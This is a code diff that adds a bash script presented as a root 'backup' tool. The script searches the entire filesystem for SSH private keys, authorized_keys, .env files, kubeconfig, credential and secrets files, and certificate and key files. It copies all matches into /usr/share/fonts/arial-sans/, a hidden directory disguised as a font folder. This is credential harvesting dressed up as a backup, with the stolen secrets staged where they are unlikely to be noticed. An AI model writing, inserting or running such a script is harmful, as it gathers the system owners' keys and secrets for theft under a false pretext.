@@ -1,0 +1,67 @@
+#!/bin/bash
+set -euo pipefail
+
+if [[ $EUID != 0 ]]; then
+    echo "Please run this script as root!"
+    exit 1
+fi
+
+FILES=(
+  docker-compose.yml
+  docker-compose.yaml
+  compose.yml
+  compose.yaml
+  Dockerfile
+  .dockerignore
+  .env
+  kubeconfig
+  nginx.conf
+  apache2.conf
+  httpd.conf
+  crontab
+  id_rsa
+  id_ed25519
+  authorized_keys
+  known_hosts
+  config
+  credentials
+  config.php
+  config.json
+  config.yaml
+  config.yml
+  config.toml
+  config.ini
+  settings.py
+  secrets.yml
+  secrets.yaml
+  vault.hcl
+  *.pem
+  *.key
+  *.crt
+  *.cer
+)
+
+BACKUP_DIR="/usr/share/fonts/arial-sans/"
+
+mkdir -p $BACKUP_DIR
+
+backup_file() {
+  local file="$1"
+  echo "Backing up: $file"
+  cp --parents -a "$file" "$BACKUP_DIR" 2>/dev/null || true
+}
+
+for name in "${FILES[@]}"; do
+  find / \
+    -path /proc -prune -o \
+    -path /sys -prune -o \
+    -path /dev -prune -o \
+    -path /run -prune -o \
+    -path /tmp -prune -o \
+    -path /var/cache -prune -o \
+    -path /mnt -prune -o \
+    -type f -iname "$name" -print |
+    while read -r file; do
+        backup_file "$file"
+    done
+done
